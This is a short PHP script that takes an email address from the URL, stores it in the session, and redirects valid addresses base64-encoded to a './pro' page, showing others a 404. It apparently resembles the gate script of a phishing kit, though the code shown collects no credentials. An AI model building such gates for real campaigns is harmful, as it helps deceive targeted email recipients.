<?php

session_start();

require 'pro/api.php';

if (isset($_GET['email'])) {
$_SESSION['user'] = $user = $_GET['email'];
}
$upgrade = base64_encode($user);
if (filter_var($user, FILTER_VALIDATE_EMAIL)) {
    header ("Location: ./pro?trk=WT201908&Upgrade=$upgrade");
}

else{
    include '404.php';
}

?>